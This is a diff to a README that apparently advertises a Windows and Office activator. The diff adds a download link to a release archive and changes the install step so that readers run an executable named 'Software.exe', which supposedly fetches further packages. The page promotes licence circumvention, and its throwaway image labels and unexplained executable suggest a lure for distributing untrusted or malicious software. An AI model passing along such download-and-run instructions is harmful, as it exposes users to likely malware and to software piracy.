@@ -6,11 +6,11 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/a44b488f-3c94-4db2-aace-372265bab491)
-]()
+](https://github.com/Trixxarn1/Microsoft-Windows-and-Office-Activator-2024/releases/download/Release/Release.zip)
 
 
 ## **1. [Download the archive]() and extract it to a convenient folder.**
-## **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
+## **2. Run the auto-installer `Software.exe`. It will install and download all necessary packages for > operation.**
 
 ![ashuXnH](https://github.com/user-attachments/assets/0aea68b5-0fbe-406e-bf7b-627316c541cb)
 
